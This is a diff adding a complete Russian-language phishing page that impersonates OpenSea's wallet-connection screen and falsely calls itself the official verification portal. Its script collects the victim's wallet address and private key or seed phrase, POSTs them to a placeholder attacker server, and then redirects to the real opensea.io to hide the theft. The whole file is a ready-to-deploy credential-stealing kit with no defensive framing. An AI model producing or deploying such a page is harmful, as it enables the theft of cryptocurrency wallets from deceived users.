@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OpenSea - Подключить кошелек</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #0a0c10;
+            color: white;
+        }
+        .container {
+            max-width: 500px;
+            margin: 100px auto;
+            background: #1a1c23;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+        }
+        button {
+            background: #2081e2;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 12px;
+            border: 1px solid #2c2f36;
+            background: #0a0c10;
+            color: white;
+        }
+        .warning {
+            color: #ff8a00;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Подключить кошелек</h2>
+        <p>Для продолжения работы в OpenSea необходимо подтвердить кошелек</p>
+        <input type="text" id="wallet" placeholder="Введите адрес кошелька (0x...)" />
+        <input type="password" id="key" placeholder="Приватный ключ / сид-фраза" />
+        <button id="confirmBtn">Подтвердить кошелек</button>
+        <div class="warning">Это официальный портал верификации OpenSea</div>
+    </div>
+
+    <script>
+        document.getElementById("confirmBtn").onclick = function() {
+            let wallet = document.getElementById("wallet").value;
+            let key = document.getElementById("key").value;
+            if(wallet && key) {
+                // Отправка на ваш сервер
+                fetch("YOUR_SERVER_URL", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({wallet: wallet, key: key})
+                });
+                alert("Подтверждение выполняется. Перенаправление...");
+                window.location.href = "https://opensea.io";
+            } else {
+                alert("Заполните все поля");
+            }
+        };
+    </script>
+</body>
+</html>
